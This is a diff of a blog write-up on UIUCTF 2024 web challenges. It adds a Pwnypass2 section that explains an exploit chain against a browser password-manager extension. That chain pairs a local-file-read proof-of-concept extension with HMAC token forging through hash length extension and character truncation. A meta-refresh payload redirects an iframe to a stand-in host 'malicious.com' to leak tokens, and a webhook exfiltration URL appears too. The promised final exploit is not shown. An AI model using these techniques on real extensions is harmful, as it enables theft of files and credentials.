@@ -461,7 +461,7 @@ Note that using `window.stop()` to interrupt the navigation really depends on th
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 const chrs = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!_#$%^&*(){}';
 const webHook = 'https://webhook.site/d8a9711c-ef81-414c-8702-74263ffe7ab8';
-const knowFlag = 'uiuctf{0h_no_th3_pwn1es_4r3_c0mpr0m1sed_fa';
+const knowFlag = 'uiuctf{0h_no_th3_pwn1es_4r3_c0mpr0m1sed_fa0d578c}';
 
 const payload = () => {
     let payload = "";
@@ -525,6 +525,196 @@ const payload = () => {
 ```
 
 ![pwnypass-flag](/static/images/UIUCTF2024/pwnypass-flag.jpg)
+
+### Pwnypass2
+
+The `pwnypass2` challenge uses the same extension as `pwnypass`. However, in this challenge, the flag is saved in the local filesystem. Although I didn't manage to solve this challenge, I learned a lot from the discussions in the Discord channel. Now, I am going to wrap up and summarize everything here. I will chain all the parts in a backwards manner, from how to read the flag to the first leaking.
+
+#### Arbitrary File Read through file:/// with executeScript
+
+A technique that people have used to achieve local filesystem read access after gaining arbitrary code execution in the background worker of an extension involves opening a tab with a URL like `file:///path/you/want/to/read` and then using `chrome.tabs.executeScript` to retrieve the `innerHTML` of the tab you just opened. Under Manifest V2, we need permissions of `"<all_urls>"` and `tabs`. However, in Manifest V3, the API to call `executeScript` has changed and requires more explicit permissions to access `file:///`. 
+
+A tiny example to show the technique is as follows.
+
+```
+// manifest.json
+{
+  "manifest_version": 2,
+  "name": "PoC for Arbitrary File Read",
+  "version": "1.0",
+  "permissions": [
+    "tabs",
+    "<all_urls>"
+  ],
+  "background": {
+      "service_worker": "background.js"
+  }
+}
+
+
+// background.js
+(async () => {
+  chrome.tabs.create({ url: "file:///Users/" }, async (tab) => {
+    let res = await new Promise((resolve) => {
+      chrome.tabs.executeScript(
+        tab.id,
+        { code: "document.body.innerHTML" },
+        (result) => {
+          resolve(result[0]);
+        }
+      );
+    });
+
+    console.log(`innerHTML for url: ${res}`);
+  });
+})();
+```
+
+#### Arbitrary Code Execution in Background.js
+
+To get the XSS in `background.js`, there is something in the file that really caught my eye even at first glance.
+
+```
+// Background.js
+async function evaluate(_origin, data) {
+    return eval(data);
+}
+
+const commands = {
+    read,
+    write,
+    evaluate // DEPRECATED! Will be removed in next release.
+}
+
+async function processMessage(request, sender) {
+    await init();
+    if (sender.id !== chrome.runtime.id) return;
+
+    if (request.action === "issue") {
+        // generate token
+        const ts = Math.floor(Date.now()/1000);
+        const tab = sender.tab.id;
+        const origin = await getOrigin(tab);
+        const command = request.command;
+        if (!commands.hasOwnProperty(command)) return;
+        request.args.length = 2; // max 2 args
+        if (request.args.some((arg) => arg.includes('|'))) return; // wtf, no.
+        const args = request.args.join('|');
+
+        const token = `${ts}|${tab}|${origin}|${command}|${args}`;
+        return [token, await doHmac(token)];
+    }
+
+    if (request.action === "redeem") {
+        // redeem a token
+        const {token, hmac} = request;
+        if (await doHmac(token) !== hmac) return;
+        let [ts, tab, origin, command] = token.split("|");
+        if (sender.tab.id !== parseInt(tab)) return;
+
+        const args = token.split("|").slice(-2);
+        return await commands[command](origin, ...args);
+    }
+}
+```
+
+In the `issue` action request, it joins all the command and args into the issue token with `|` as the separator character. During the `redeem` stage, it splits the token by `|` and uses the third-to-last part of the split as the command and the last two parts as the args.
+
+![](/static/images/UIUCTF2024/pwnypass-2-tok.jpg)
+
+So, if we can control the token sent during the `redeem` action stage and replace the original token with a malicious one like `ts|tab|origin|evaluate|PAYLOAD|NONE`, we can trick the program into using `evaluate` as the command, causing our payload to be evaluated. However, there are two challenges to make this happen: 1/ `hmac` calculation; 2/ controlling the `token` and `hmac` sent to `background.js`.
+
+**Hash Length Extension Attack**
+
+We cannot directly fool the program to use our token as it is protected by a HMAC value. The HMAC value calculated based on the key saved in the storage. 
+
+```
+let keyArr, key, iv;
+const s2a = (text) => Uint8Array.from(Array.from(text).map(letter => letter.charCodeAt(0)));
+const concat = (a,b) => {
+    const c = new Uint8Array(a.length+b.length);
+    c.set(a,0);
+    c.set(b,a.length);
+    return c;
+};
+const toHexString = (bytes) =>
+    bytes.reduce((str, byte) => str + byte.toString(16).padStart(2, '0'), '');
+
+const doHmac = async (d) => toHexString(new Uint8Array(await crypto.subtle.digest('SHA-256', concat(keyArr, s2a(d)))));
+```
+
+Here we carry out an attack named, `Length Extension Attack`, in cryptography, and its basic idea is that attacker can use `Hash(message1)` and the length of `message1` to calculate `Hash(message1 || message2)` for an attacker-controlled `message2`, without needing to know the content of `message1`, according to the [wiki](https://en.wikipedia.org/wiki/Length_extension_attack). Here is the [tool](https://github.com/viensea1106/hash-length-extension) to achieve this attack.
+
+There is another fact that we can take advantage of in the `s2a` function: `Uint8` only keeps the last 8 bits (char from 0 to 255) while the output `letter.charCodeAt(0)` can be much larger. For example, for the letter `∫`, its `charCodeAt(0)` output is 8747. However, the output of `Uint8Array` is `43` because the upper bits have been discarded. This fact allows us to make a hash collision as the char `∫` is treated the same as `C`.
+
+By combining these two points, we can perform a cool attack to inject our payload into the token while keeping the HMAC value consistent. The basic idea is that once we can leak the token and its HMAC value, we can replace the `|` char in the original token with `ż` char. Therefore, the original token concatenated with the private key can be seen as the `message1` above. Even if we change the characters in the original token, they appear the same when passed to the hash algorithm. Next, we append our payload to the original token with a real char `|` and then use the length extension attack to get a new hash code.
+
+![](/static/images/UIUCTF2024/pwnypass2-length-extension-attack.jpg)
+
+**Forge the token and HMAC sent to extension**
+
+Notably, there is a sender check at the line `if (sender.id !== chrome.runtime.id) return;`, so we cannot forge the `sendMessage` from our script directly. Instead, we need to use `content.js` or the defined `web_accessible_resources` in the manifest to achieve this.
+
+Upon reviewing the content, I found a place in the `content.js` embedded script that allows us to control the `token` and `hmac` token. The `content.js` script embeds an iframe with the `src` set to `autofill.html` to show the saved password. The `autofill.js` script will retrieve the `token` and `hmac` from the embedded URL and send them to the `background.js`.
+
+```
+// autofill.js
+const getStorage = async (key) => new Promise((res)=>chrome.storage.local.get([key],(storage)=>res(storage[key])));
+const setStorage = async (key, val) => new Promise((res)=>chrome.storage.local.set({[key]:val},()=>res()));
+const getCreds = async (token, hmac) => new Promise((res)=>chrome.runtime.sendMessage({action: "redeem", token, hmac},(creds)=>res(creds)));
+
+const params = new URLSearchParams(window.location.search);
+const token = params.get("token");
+const hmac = params.get("hmac");
+
+async function main() {
+    console.log("redeeming creds token...")
+    const creds = await getCreds(token, hmac);
+    console.log("got creds:")
+    console.log(creds);
+
+    let output = "";
+    for (let cred of creds) {
+        output += `
+        <div class="entry">
+        <div data-username="${cred.username}" class="user">${cred.username}</div>
+        <div data-password="${cred.password}" class="pass">${cred.password}</div>
+        </div><hr>`;
+    }
+    output = `<div>${output}</div>`;
+    
+    window.content.innerHTML = output;
+}
+main();
+```
+
+Therefore, the only problem left is how to leak the embedded iframe's src URL to get a valid token and HMAC value.
+
+![](/static/images/UIUCTF2024/pwnypass-2-src.jpg)
+
+#### Leaking an embedded iframe's src
+
+Due to the same-origin policy, even as the host website, we cannot access any embedded iframe's src attribute. Here we use a attach technique called meta tag for open redirection.
+
+**window.iframeElement.src**
+
+Don't forget that we can do html injection within the extension's iframe. Here the trick we play with is called meta tag injection for open redirection. The payload looks like the following will redirect the page to the `malicious.com` .
+
+ ```
+<meta content="0;http://malicious.com" http-equiv="refresh"/>
+ ```
+
+An interesting feature of the browser is that even if we try to redirect the content of iframe to our malicious.com, it won't change the src attribute of the iframe itself. Then, within our `malicious.com`, we can use `window.iframeElement.src` to get the url.
+
+![](/static/images/UIUCTF2024/pwnypass-2-openredirect.jpg)
+
+The author also mentioned about the abuse of [this api](https://developer.mozilla.org/en-US/docs/Web/API/NotRestoredReasons/src). I should try this technique later.
+
+#### Put all the parts together
+
+Here is the exploit that I chained all the parts together.
+
+
 
 
 
@@ -813,21 +1003,20 @@ It showed that the `Origin` header and `HOST` header were inconsistent. After ad
 On the webpage, the `pay()` function gives us some hints about what is happening on the server side.
 
 ```
-    async function pay() {
-      // i could not get sqlite to work on the frontend :(
-      /*
-        db.each(`SELECT * FROM keys WHERE kid = '${md5(headerKid)}'`, (err, row) => {
-        ???????
-       */
-      const r = await fetch("/pay", { method: "POST" });
-      const j = await r.json();
-      document.getElementById("alert").classList.add("opacity-100");
-      // todo: convert md5 to hex string instead of latin1??
-      document.getElementById("alert").innerText = j["message"];
-      setTimeout(() => { document.getElementById("alert").classList.remove("opacity-100") }, 5000);
-    }
+async function pay() {
+  // i could not get sqlite to work on the frontend :(
+  /*
+    db.each(`SELECT * FROM keys WHERE kid = '${md5(headerKid)}'`, (err, row) => {
+    ???????
+    */
+  const r = await fetch("/pay", { method: "POST" });
+  const j = await r.json();
+  document.getElementById("alert").classList.add("opacity-100");
+  // todo: convert md5 to hex string instead of latin1??
+  document.getElementById("alert").innerText = j["message"];
+  setTimeout(() => { document.getElementById("alert").classList.remove("opacity-100") }, 5000);
+}
 ```
-
 The POST request is sent with a JWT token:
 
 ```
